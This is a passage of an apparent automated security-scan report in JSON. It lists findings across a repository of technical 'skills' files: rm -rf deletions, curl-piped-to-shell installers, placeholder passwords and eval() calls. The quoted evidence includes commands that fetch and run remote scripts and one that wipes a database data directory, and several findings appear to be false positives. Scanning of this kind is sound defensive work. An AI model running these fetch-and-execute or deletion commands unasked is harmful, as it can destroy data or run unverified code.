        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1423,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1551,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/REFERENCE.md",
        "line_number": 1952,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf /var/lib/apt/lists/*  # Safe: cleaning package manager cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 39,
        "issue": "Pipe curl to shell",
        "evidence": "curl -fsSL https://tailscale.com/install.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/networking/tailscale-vpn.md",
        "line_number": 281,
        "issue": "Pipe curl to shell",
        "evidence": "RUN curl -fsSL https://tailscale.com/install.sh | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 654,
        "issue": "Pipe curl to shell",
        "evidence": "- curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/engineering/ci-cd-pipelines.md",
        "line_number": 664,
        "issue": "Pipe curl to shell",
        "evidence": "- curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/infrastructure/terraform-best-practices/resources/REFERENCE.md",
        "line_number": 2255,
        "issue": "Pipe curl to shell",
        "evidence": "curl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/cicd/ci-optimization.md",
        "line_number": 654,
        "issue": "Destructive file deletion",
        "evidence": "- run: rm -rf dist node_modules",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/database/postgres-migrations/resources/REFERENCE.md",
        "line_number": 1558,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf $PGDATA/*",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/formal/lean-proof-basics.md",
        "line_number": 71,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://raw.githubusercontent.com/leanprover/elan/master/elan-init.sh -sSf | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/collaboration/github/github-actions-workflows/resources/REFERENCE.md",
        "line_number": 1941,
        "issue": "Destructive file deletion",
        "evidence": "rm -rf node_modules  # Safe: cleaning CI cache",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 250,
        "issue": "Destructive file deletion",
        "evidence": "\"clean\": \"rm -rf node_modules ios/Pods ios/build android/build\",  # Cleans build artifacts only - safe to run",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 251,
        "issue": "Destructive file deletion",
        "evidence": "\"clean:metro\": \"rm -rf $TMPDIR/metro-* $TMPDIR/haste-*\",  # Cleans Metro bundler cache - safe to run",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/mobile/react-native-setup.md",
        "line_number": 392,
        "issue": "Destructive file deletion",
        "evidence": "\u2705 Clear cache with `npm run clean:metro` or `rm -rf $TMPDIR/metro-*`  (safe - cleans Metro cache)",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/python/fastapi-limiter.py",
        "line_number": 126,
        "issue": "eval() usage",
        "evidence": "result = await redis_client.eval(",
        "recommendation": "Never use eval() with user input"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 220,
        "issue": "Destructive file deletion",
        "evidence": "if 'apt-get install' in line and 'rm -rf /var/lib/apt/lists/*' not in line:",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 222,
        "issue": "Destructive file deletion",
        "evidence": "if not self._is_multiline_command_with_cleanup(i, 'rm -rf /var/lib/apt/lists/*'):",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/containers/dockerfile-optimization/resources/scripts/analyze_dockerfile.py",
        "line_number": 229,
        "issue": "Destructive file deletion",
        "evidence": "recommendation='Add: && rm -rf /var/lib/apt/lists/* in same RUN'",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Command Injection Risk",
        "file": "skills/engineering/code-review/resources/examples/python/automated_review_checks.py",
        "line_number": 287,
        "issue": "eval() usage",
        "evidence": "message=\"Use of 'eval()' is a security risk. \"",
        "recommendation": "Never use eval() with user input"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/cloud/aws-lambda-deployment/resources/scripts/test_function.sh",
        "line_number": 244,
        "issue": "Destructive file deletion",
        "evidence": "trap \"rm -rf $tmp_dir\" EXIT  # Test cleanup - safe in test context",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/cryptography/encryption-at-rest/resources/scripts/benchmark_encryption.sh",
        "line_number": 41,
        "issue": "Destructive file deletion",
        "evidence": "trap 'rm -rf \"$TEMP_DIR\"' EXIT  # Test cleanup - safe in test context",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Dangerous Command",
        "file": "skills/security/security-headers/resources/scripts/test_headers.sh",
        "line_number": 413,
        "issue": "Destructive file deletion",
        "evidence": "trap 'rm -rf \"$TEMP_DIR\"' EXIT  # Test cleanup - safe in test context",
        "recommendation": "Use safer alternatives or require explicit confirmation"
      },
      {
        "severity": "CRITICAL",
        "category": "Command Injection Risk",
        "file": "skills/api/api-rate-limiting/resources/examples/nodejs/express-rate-limiter.js",
        "line_number": 30,
        "issue": "eval() usage",
        "evidence": "redisClient.eval(script, numKeys, ...args, (err, result) => {",
        "recommendation": "Never use eval() with user input"
      }
    ]
  },
  "findings_by_category": {
    "Hardcoded Secret": [
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud-kubernetes-deployment.md",
        "line_number": 358,
        "issue": "Possible hardcoded password",
        "evidence": "db.password: \"changeme123\"  # Example only - use secret management in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/SECURITY.md",
        "line_number": 43,
        "issue": "Possible hardcoded password",
        "evidence": "password = \"MyRealPassword123\"",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/SECURITY.md",
        "line_number": 130,
        "issue": "Possible hardcoded password",
        "evidence": "DB_PASSWORD=\"xK9mP2nQ7sL4\"",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/api/api-authentication/resources/scripts/README.md",
        "line_number": 173,
        "issue": "Possible hardcoded token",
        "evidence": "TOKEN=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"  # Test token for security audit only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 53,
        "issue": "Possible hardcoded password",
        "evidence": "MasterUserPassword='SecurePassword123!',  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 301,
        "issue": "Possible hardcoded password",
        "evidence": "MasterUserPassword='SecurePassword123!',  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 375,
        "issue": "Possible hardcoded password",
        "evidence": "Password='migration_password'  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 387,
        "issue": "Possible hardcoded password",
        "evidence": "Password='SecurePassword123!'  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/aws/aws-databases.md",
        "line_number": 432,
        "issue": "Possible hardcoded password",
        "evidence": "password='SecurePassword123!'  # Example only - use AWS Secrets Manager in production",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cloud/gcp/gcp-iam-security.md",
        "line_number": 570,
        "issue": "Possible hardcoded password",
        "evidence": "DATABASE_PASSWORD = \"super_secret_password\"  # Exposed in source control! Example only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
        "line_number": 1949,
        "issue": "Possible hardcoded password",
        "evidence": "password=\"admin-secret\"  # Example only - use secure credential management",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
        "line_number": 1962,
        "issue": "Possible hardcoded password",
        "evidence": "sasl_plain_password='alice-secret'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/protocols/kafka-streams/resources/REFERENCE.md",
        "line_number": 1974,
        "issue": "Possible hardcoded password",
        "evidence": "sasl_plain_password='alice-secret'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/certificate-management.md",
        "line_number": 141,
        "issue": "Possible hardcoded token",
        "evidence": "export CF_Token=\"your-cloudflare-api-token\"  # Placeholder - replace with actual API token from Cloudflare dashboard",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/encryption-at-rest/resources/REFERENCE.md",
        "line_number": 411,
        "issue": "Possible hardcoded password",
        "evidence": "password = \"user-password\"  # Example only - in production, get from secure input",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/certificate-management/resources/REFERENCE.md",
        "line_number": 876,
        "issue": "Possible hardcoded token",
        "evidence": "export CF_Token=\"your-cloudflare-api-token\"  # Placeholder - replace with actual API token from Cloudflare dashboard",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "CRITICAL",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/signing-verification/resources/REFERENCE.md",
        "line_number": 2365,
        "issue": "Private key in file",
        "evidence": "private_key = \"\"\"-----BEGIN PRIVATE KEY-----",
        "recommendation": "Never commit private keys"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 992,
        "issue": "Possible hardcoded password",
        "evidence": "password=\"admin_password\"  # Example only - use actual credentials from secure storage",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 1300,
        "issue": "Possible hardcoded password",
        "evidence": "admin_password='admin_password'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 1494,
        "issue": "Possible hardcoded password",
        "evidence": "password='old_password'  # Example only - use environment variable or secret manager",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/cryptography/secrets-rotation/resources/REFERENCE.md",
        "line_number": 2314,
        "issue": "Possible hardcoded password",
        "evidence": "password: \"my_password_123\"  # Plaintext in config - example only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/secrets-management.md",
        "line_number": 41,
        "issue": "Possible hardcoded password",
        "evidence": "DB_PASSWORD = \"MyP@ssw0rd123\"  # Example of what NOT to do",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/secrets-management.md",
        "line_number": 667,
        "issue": "Possible hardcoded password",
        "evidence": "connect(password=\"secret123\")  # Example only - never hardcode passwords",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/vulnerability-assessment.md",
        "line_number": 389,
        "issue": "Possible hardcoded token",
        "evidence": "expired_token = \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...\"  # Test token for security validation only",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/vulnerability-assessment/resources/REFERENCE.md",
        "line_number": 74,
        "issue": "Possible hardcoded password",
        "evidence": "SELECT * FROM users WHERE username = '$username' AND password = '$password'",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/oauth2-implementation/resources/REFERENCE.md",
        "line_number": 2584,
        "issue": "Possible hardcoded token",
        "evidence": "access_token='initial_access_token',  # Placeholder - use actual token from auth response",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/security/oauth2-implementation/resources/REFERENCE.md",
        "line_number": 2585,
        "issue": "Possible hardcoded token",
        "evidence": "refresh_token='initial_refresh_token',  # Placeholder - use actual token from auth response",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/engineering/monitoring-alerts/resources/REFERENCE.md",
        "line_number": 2017,
        "issue": "Possible hardcoded password",
        "evidence": "auth_password: '${SMTP_PASSWORD}'  # Environment variable - set securely before running",
        "recommendation": "Use environment variables or secret management"
      },
      {
        "severity": "HIGH",
        "category": "Hardcoded Secret",
        "file": "skills/proxies/forward-proxy.md",
        "line_number": 544,
        "issue": "Possible hardcoded password",
        "evidence": "password = \"p@ss:word\"  # Example - use actual credentials from environment",
        "recommendation": "Use environment variables or secret management"
      }
    ],
    "Network Security": [
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud-kubernetes-deployment.md",
        "line_number": 426,
        "issue": "Unencrypted HTTP",
        "evidence": "kubectl run -it --rm debug --image=curlimages/curl --restart=Never -- curl http://web",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/SECURITY.md",
        "line_number": 114,
        "issue": "Pipe curl to shell",
        "evidence": "- `curl URL | bash` or `wget URL | sh`",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/SECURITY.md",
        "line_number": 114,
        "issue": "Pipe wget to shell",
        "evidence": "- `curl URL | bash` or `wget URL | sh`",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/api/api-authorization.md",
        "line_number": 462,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://opa:8181/v1/data/app/authz/allow\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/api/api-rate-limiting.md",
        "line_number": 1013,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 356,
        "issue": "Unencrypted HTTP",
        "evidence": "curl \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 359,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/${RequestId}/response\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 363,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/${RequestId}/error\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 377,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next\")",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 385,
        "issue": "Unencrypted HTTP",
        "evidence": "curl -sS -X POST \"http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/$REQUEST_ID/response\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 3093,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/register\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws-lambda-deployment/resources/REFERENCE.md",
        "line_number": 3102,
        "issue": "Unencrypted HTTP",
        "evidence": "\"http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/event/next\" \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws/aws-api-gateway.md",
        "line_number": 406,
        "issue": "Unencrypted HTTP",
        "evidence": "\"$schema\": \"http://json-schema.org/draft-04/schema#\",",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws/aws-ec2-compute.md",
        "line_number": 525,
        "issue": "Unencrypted HTTP",
        "evidence": "METADATA_URL = \"http://169.254.169.254/latest/meta-data/\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/aws/aws-ec2-compute.md",
        "line_number": 526,
        "issue": "Unencrypted HTTP",
        "evidence": "TOKEN_URL = \"http://169.254.169.254/latest/api/token\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 1623,
        "issue": "Unencrypted HTTP",
        "evidence": "url: http://flagger-loadtester/",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 1626,
        "issue": "Unencrypted HTTP",
        "evidence": "cmd: \"hey -z 1m -q 10 -c 2 http://myapp/\"",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 3696,
        "issue": "Unencrypted HTTP",
        "evidence": "serverAddress: http://prometheus.monitoring.svc.cluster.local:9090",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cloud/kubernetes-deployment/resources/REFERENCE.md",
        "line_number": 4383,
        "issue": "Unencrypted HTTP",
        "evidence": "kubectl run -it --rm debug --image=curlimages/curl --restart=Never -- curl http://<service-name>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/wasm/wasm-rust-toolchain.md",
        "line_number": 207,
        "issue": "Pipe curl to shell",
        "evidence": "curl https://rustwasm.github.io/wasm-pack/installer/init.sh -sSf | sh",
        "recommendation": "Download, verify, then execute"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/realtime/websocket-implementation.md",
        "line_number": 456,
        "issue": "Unencrypted HTTP",
        "evidence": "const url = new URL(req.url!, `http://${req.headers.host}`);",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/realtime/websocket-implementation/resources/REFERENCE.md",
        "line_number": 1168,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/caching/cdn-edge-caching.md",
        "line_number": 632,
        "issue": "Unencrypted HTTP",
        "evidence": "for url_element in root.findall('.//{http://www.sitemaps.org/schemas/sitemap/0.9}loc'):",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/websocket-protocols.md",
        "line_number": 281,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://websocket_backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/kafka-streams/resources/examples/README.md",
        "line_number": 128,
        "issue": "Unencrypted HTTP",
        "evidence": "docker-compose exec ksqldb-cli ksql http://ksqldb-server:8088",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 1461,
        "issue": "Unencrypted HTTP",
        "evidence": "auth.http.auth_req.url = http://auth-service/mqtt/auth",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 2280,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://mqtt;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/protocols/mqtt-messaging/resources/REFERENCE.md",
        "line_number": 3075,
        "issue": "Unencrypted HTTP",
        "evidence": "prometheus.push.gateway.server = http://pushgateway:9091",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 89,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend1;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 102,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend2;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 115,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend3;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 138,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/sni-routing.md",
        "line_number": 288,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://$subdomain-backend:8080;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 111,
        "issue": "Unencrypted HTTP",
        "evidence": "<Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\">",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 114,
        "issue": "Unencrypted HTTP",
        "evidence": "<SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 116,
        "issue": "Unencrypted HTTP",
        "evidence": "<DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/>",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 191,
        "issue": "Unencrypted HTTP",
        "evidence": "/tr http://timestamp.digicert.com /td SHA256 \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 327,
        "issue": "Unencrypted HTTP",
        "evidence": "http://timestamp.digicert.com > response.tsr",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 335,
        "issue": "Unencrypted HTTP",
        "evidence": "- DigiCert: `http://timestamp.digicert.com`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 336,
        "issue": "Unencrypted HTTP",
        "evidence": "- Sectigo: `http://timestamp.sectigo.com`",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 443,
        "issue": "Unencrypted HTTP",
        "evidence": "wget http://crl.example.com/revoked.crl",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 454,
        "issue": "Unencrypted HTTP",
        "evidence": "-url http://ocsp.example.com \\",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 565,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /tr http://timestamp.digicert.com /td SHA256 app.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 613,
        "issue": "Unencrypted HTTP",
        "evidence": "openssl ocsp -issuer ca.pem -cert cert.pem -url http://ocsp.example.com",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/signing-verification.md",
        "line_number": 838,
        "issue": "Unencrypted HTTP",
        "evidence": "signtool sign /f cert.pfx /p password /tr http://timestamp.digicert.com /td SHA256 app.exe",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/tls-configuration.md",
        "line_number": 129,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "MEDIUM",
        "category": "Network Security",
        "file": "skills/cryptography/tls-configuration.md",
        "line_number": 319,
        "issue": "Unencrypted HTTP",
        "evidence": "proxy_pass http://backend;",
        "recommendation": "Use HTTPS for external resources"
      },
      {
        "severity": "CRITICAL",
        "category": "Network Security",
        "file": "skills/cryptography/certificate-management.md",
